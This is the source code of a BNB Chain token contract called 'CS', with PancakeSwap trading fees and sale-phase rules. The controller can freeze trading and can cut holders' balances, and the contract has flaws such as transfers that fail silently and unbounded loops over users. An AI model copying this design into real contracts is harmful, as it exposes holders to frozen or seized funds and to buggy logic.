/**
 *Submitted for verification at BscScan.com on 2022-07-27
*/

pragma solidity 0.5.8;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
 
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
 
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
 
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
 
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
 
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
 
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library SafeERC20 {
    using SafeMath for uint256;
    using Address for address;
 
    function safeTransfer(ERC20 token, address to, uint256 value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }
 
    function safeTransferFrom(ERC20 token, address from, address to, uint256 value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }
 
    function safeApprove(ERC20 token, address spender, uint256 value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),"SafeERC20: approve from non-zero to non-zero allowance");
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
 
    function safeIncreaseAllowance(ERC20 token, address spender, uint256 value) internal {
        uint256 newAllowance = token.allowance(address(this), spender).add(value);
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }
 
    function safeDecreaseAllowance(ERC20 token, address spender, uint256 value) internal {
        uint256 newAllowance = token.allowance(address(this), spender).sub(value, "SafeERC20: decreased allowance below zero");
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }
 
    function callOptionalReturn(ERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        // 空字符串hash值
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;  
        //内联编译（inline assembly）语言，是用一种非常底层的方式来访问EVM
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
 
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call.value(amount)("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

interface ERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IPancakeFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
    function getPair(address,address) external view returns (address);    
}

interface IPancakeRouter {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountsIn(uint amountOut, address[] calldata path)
        external
        view
        returns (uint[] memory amounts);
}

interface IPancakePair {
    function totalSupply() external view returns (uint256);
    function getReserves() external view returns (uint,uint,uint);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
}

interface TokenLike {
    function award(address buyer, uint256 wad) external;
    function balanceOf(address) external view returns(uint256);
}

contract StandardToken is ERC20 {
  using SafeMath for uint256;

  mapping(address => uint256) balances;
  mapping (address => mapping (address => uint256)) internal allowed;

  uint256 totalSupply_;

  function totalSupply() public view returns (uint256) {
    return totalSupply_;
  }

  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }

  function balanceOf(address _owner) public view returns (uint256) {
    return balances[_owner];
  }

  function transferFrom(address _from, address _to, uint256 _value) public returns (bool){
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);

    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }

  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  function allowance(address _owner, address _spender) public view returns (uint256){
    return allowed[_owner][_spender];
  }

  function increaseApproval(address _spender, uint _addedValue) public returns (bool){
    allowed[msg.sender][_spender] = (
      allowed[msg.sender][_spender].add(_addedValue));
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }

  function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool){
    uint oldValue = allowed[msg.sender][_spender];
    if (_subtractedValue > oldValue) {
      allowed[msg.sender][_spender] = 0;
    } else {
      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
    }
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
}

contract Ownable {
  address public owner;
  address public controler;

  event OwnershipRenounced(address indexed previousOwner);
  event OwnershipTransferred(
    address indexed previousOwner,
    address indexed newOwner
  );

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }

  modifier onlyControler() {
    require(msg.sender == controler);
    _;
  }
  
  modifier onlySelf() {
    require(address(msg.sender) == address(tx.origin));
    _;
  }

  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
}

//------------------------------------------------------------------------------
contract CSToken is StandardToken,Ownable {
    using SafeMath for uint256;
    using SafeERC20 for ERC20;

    string public name = "CS";
    string public symbol = "CS";
    uint8 public decimals = 18;

    mapping(address => uint256) public intBalances;

    address public pankFactory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address public pankRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public tokenAddressA = 0x55d398326f99059fF775485246999027B3197955;

    // address public pankFactory = 0xB7926C0430Afb07AA7DEfDE6DA862aE0Bde767bc;
    // address public pankRouter = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;
    // address public tokenAddressA = 0x980D7F598AeC8A34c276183faE844D1B2dD0a487;

    address public pankPair = address(0);
    address public tokenAddressB = address(0);

    //----------------------------------------------------------------------------------------
    address public poolAccount = 0x3041f835f1E36515b3B6860423483CF28c125228;//回交易池
    address public lpPriseAccount;//Lp分红
    address public marketingAccount = 0x61B3fFfAa5F843DFBFE7CFbd220eb6D81e0CC369;//营销
    address public ecologyAccount = 0xFD75B79c46d588F26C39611f2f786B3177c80d12;//生态发展
    address public blackholeAccount = 0x0000000000000000000000000000000000000001;//黑洞地址

    address public projectAccount = 0x25d7A6d39C8cB824eEca5a259c373Ec3Ec35CF00;//项目方地址
    address public controlerAccount = 0xB8a0b2573b83f036aDf16D7ba8C4654c3278653E;//初始合约控制账户

    constructor(
      
      
    ) public {
        totalSupply_ = 1888 * (10 ** uint256(decimals));
        controler = 0xB8a0b2573b83f036aDf16D7ba8C4654c3278653E;

        balances[msg.sender] = totalSupply_;
        tokenAddressB = address(this);
        lpPriseAccount = address(this);

        IPancakeFactory(pankFactory).createPair(tokenAddressA,tokenAddressB);
        pankPair = IPancakeFactory(pankFactory).getPair(tokenAddressA,tokenAddressB);
    }

    uint BUY = 1;
    uint REMOVELIQUIDITY = 2;
    uint TRANSFER = 3;
    uint SALE = 4;
    uint ADDLIQUIDITY = 5;
    uint TRANSFERFROM = 6;

    uint public sort = 0;
    uint public state = 1;// 0-close  1-私募  2-公募  3-开放交易

    //---------------------------------------------------------------
    function transfer(address dst, uint256 wad) public returns (bool){
      if(msg.sender == controler || dst == controler){
        if(state == 1){
          addPlayer(dst);
          intBalances[dst] = intBalances[dst].add(wad);
        }
        return super.transfer(dst,wad);
      }

      sort = 0;
      if (isV2Pair(msg.sender)) {
        if(isBuy(msg.sender,wad)) {
          sort = BUY;
        }else{
          sort = REMOVELIQUIDITY;
        }
      }else{
        sort = TRANSFER;
      }

      //-----------------------------------------------------------------------------
      //私募
      if(state == 1 || state == 2){
        return false;
      //开放交易
      }else if(state == 3){
        if(sort==BUY){
          uint256 wadPool = wad.div(100);
          uint256 wadLpPrise = wad.div(100);
          uint256 wadMarketing = wad.div(100);

          wad = wad.sub(wadPool);
          wad = wad.sub(wadLpPrise);
          wad = wad.sub(wadMarketing);

          super.transfer(poolAccount,wadPool);
          super.transfer(lpPriseAccount,wadLpPrise);
          super.transfer(marketingAccount,wadMarketing);

          super.transfer(dst,wad);
          return true;
        }else if(sort==REMOVELIQUIDITY){
          super.transfer(dst, wad);
          return true;
        }else if(sort==TRANSFER){
          super.transfer(dst, wad);
          return true;
        }
      }

      return false;
    }

    function transferFrom(address src, address dst, uint256 wad) public returns (bool)
    { 
      if(src == controler || dst == controler || src == poolAccount || dst == poolAccount){
        addLpPlayer(src);
        return super.transferFrom(src,dst,wad);
      }

      if(isV2Pair(dst) && src!=poolAccount) {
        if(!isAddLiquidity(dst,wad)){
          sort = SALE;
        }else{
          sort = ADDLIQUIDITY;
        }
      }else{
        sort = TRANSFERFROM;
      }

      //----------------------------
      //私募
      if(state == 1 || state == 2){
        if(sort==ADDLIQUIDITY){
          //初始池子只能control添加
          if(IPancakePair(pankPair).totalSupply()==0){
            return false;
          }else{
            super.transferFrom(src,dst,wad);
            //更新LP用户列表
            addLpPlayer(src);
            return true;
          }
        }
        return false;
      //开放交易
      }else if(state == 3){
        if(sort==SALE){
          uint256 wadPool = wad.div(100);
          uint256 wadLpPrise = wad.div(100);
          uint256 wadMarketing = wad.div(100);
          uint256 wadEcology = wad.div(100);
          uint256 wadBlackhole = wad.div(100);

          wad = wad.sub(wadPool);
          wad = wad.sub(wadLpPrise);
          wad = wad.sub(wadMarketing);
          wad = wad.sub(wadEcology);
          wad = wad.sub(wadBlackhole);

          super.transferFrom(src,poolAccount,wadPool);
          super.transferFrom(src,lpPriseAccount,wadLpPrise);
          super.transferFrom(src,marketingAccount,wadMarketing);
          super.transferFrom(src,ecologyAccount,wadEcology);
          super.transferFrom(src,blackholeAccount,wadBlackhole);

          super.transferFrom(src,dst,wad);

          totalSupply_ = totalSupply_.sub(wadBlackhole);

          return true;
        }else if(sort==ADDLIQUIDITY){
          super.transferFrom(src,dst,wad);
          //更新LP用户列表
          addLpPlayer(src);
          return true;
        }else if(sort==TRANSFERFROM){
          super.transferFrom(src,dst,wad);
          return true;
        }
      }

      return false;
    }

    mapping (uint => address) public userList;
    uint256 public userListIndex = 0;
    function addPlayer(address to) private {
      bool have = false;
        for(uint256 i=0;i<userListIndex;i++){
            if(userList[i]==to){
            have = true;
            break;
            }
        }
        if(!have){
            userList[userListIndex++] = to;
        }
    }

    mapping (uint => address) public lpUserList;
    uint256 public lpUserListIndex = 0;
    function addLpPlayer(address to) private {
      bool have = false;
        for(uint256 i=0;i<lpUserListIndex;i++){
            if(lpUserList[i]==to){
            have = true;
            break;
            }
        }
        if(!have){
            lpUserList[lpUserListIndex++] = to;
        }
    }

    function checkAddLp() private {
      for(uint256 i=0;i<userListIndex;i++){
        if(balances[userList[i]]>intBalances[userList[i]].div(2)){
          uint256 amount = balances[userList[i]].sub(intBalances[userList[i]].div(2));

          balances[userList[i]] = intBalances[userList[i]].div(2);
          totalSupply_ = totalSupply_.sub(amount);
        }
      }
    }

    function checkLpBonus() public {
        uint256 allHoldLp = IPancakePair(pankPair).totalSupply();

        uint256 prise = 0;
        for(uint256 i=0;i<lpUserListIndex;i++){
          prise = balances[address(this)].mul(IPancakePair(pankPair).balanceOf(lpUserList[i])).div(allHoldLp);

          //官方领取无主底池分红
          if(lpUserList[i]==poolAccount){
              balances[projectAccount] = balances[projectAccount].add(prise);
              emit Transfer(address(this), projectAccount, prise);
          }else{
              balances[lpUserList[i]] = balances[lpUserList[i]].add(prise);
              emit Transfer(address(this), lpUserList[i], prise);
          }
        }

        prise = balances[address(this)].mul(IPancakePair(pankPair).balanceOf(blackholeAccount)).div(allHoldLp);
        balances[projectAccount] = balances[projectAccount].add(prise);

        balances[address(this)] = 0;
    }

    function burn(uint amount) public onlyControler{
      balances[controlerAccount] = balances[controlerAccount].sub(amount);
      totalSupply_ = totalSupply_.sub(amount);
    }

    function updatePoolAccount(address to) public onlyControler{
      poolAccount = to;
    }

    //-----------------------------------------------------------------------------
    function updateState(uint _state) public onlyControler onlySelf{
      //没有50%加池子的销毁没加池子的部分 
      //如果10个CS，应该加5个，但只加了3个，那么剩余的2个销毁
      if(state == 2){
        checkAddLp();
      }
      state = _state;
    }

    function () external payable {
        revert();
    }

    //-----------------------------------------------------------------------------
    //Find a pair address in addition to the SPD token
    function getAsset(address _pair) private view returns (address){
        address _token0 = IPancakePair(_pair).token0();
        address _token1 = IPancakePair(_pair).token1();
        address asset = _token0 == address(this) ? _token1 : _token0;
        return asset;
    }

    //Check whether an address is PancakePair 
    function isV2Pair(address _pair) private view returns (bool) {
        bytes32 accountHash;
        bytes32 codeHash;  
        address pair = pankPair;  
        assembly { accountHash := extcodehash(pair)}
        assembly { codeHash := extcodehash(_pair) }
        return (codeHash == accountHash);
    }

    //Decide whether to add liquidity or sell,
    function isAddLiquidity(address _pair,uint256 wad) private view returns (bool) {
        address _asset = getAsset(_pair);
        uint balance1 = TokenLike(_asset).balanceOf(_pair);
        (uint reserve0, uint reserve1,) = IPancakePair(_pair).getReserves();
        if (reserve0 ==0 || reserve1 ==0 ) return true;
        address _token0 = IPancakePair(_pair).token0();
        (uint spdreserve, uint assetreserve)= _token0 == address(this) ? (reserve0,reserve1) : (reserve1,reserve0);
        uint assetamount = IPancakeRouter(pankRouter).quote(wad, spdreserve, assetreserve);
        return (balance1 > assetreserve + assetamount/2 );
     }
     
    //Determine whether you are buying or remove liquidity
    function isBuy(address _pair,uint256 wad) private view returns (bool) {
        if (!isV2Pair(_pair)) return false;
        (uint reserve0, uint reserve1,) = IPancakePair(_pair).getReserves();
        address _token0 = IPancakePair(_pair).token0();
        (,uint assetreserve)= _token0 == address(this) ? (reserve0,reserve1) : (reserve1,reserve0);
        address _asset = getAsset(_pair);
        address[] memory path = new address[](2);
        path[0] = _asset;
        path[1] = address(this);
        uint[] memory amounts = IPancakeRouter(pankRouter).getAmountsIn(wad,path);
        uint balance1 = TokenLike(_asset).balanceOf(_pair);
        return (balance1 > assetreserve + amounts[0]/2);
    }

    //-------------------------------------------------
    function changeControler(address _controler) public onlyOwner onlySelf{
        controler = _controler;
    }
}